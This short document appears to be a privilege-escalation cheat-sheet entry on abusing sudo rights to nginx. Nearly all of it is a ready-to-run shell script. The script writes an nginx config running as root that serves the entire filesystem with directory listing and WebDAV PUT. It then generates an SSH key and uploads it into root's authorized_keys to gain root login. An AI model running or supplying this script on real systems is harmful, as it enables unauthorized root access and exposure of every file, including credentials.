If we have sudo rights to run nginx, we can set up our own web server and set up various vulnerable parameters or methods, and we can also just allow read access to the entire file system.

```
#!/bin/sh
echo "[+] Creating configuration..."
cat << EOF > /tmp/nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
	server {
	        listen 1339;  # This makes the server listen on port 1339
	        root /;  # allow to read all system files
	        autoindex on;  # allows us to move around directories.
	        dav_methods PUT;  # this methods allows us to put file in the system.
	}
}
EOF
echo "[+] Loading configuration..."
sudo nginx -c /tmp/nginx_pwn.conf
echo "[+] Generating SSH Key..."
ssh-keygen
echo "[+] Display SSH Private Key for copy..."
cat .ssh/id_rsa
echo "[+] Add key to root user..."
curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat .ssh/id_rsa.pub)"
echo "[+] Use the SSH key to get access"
```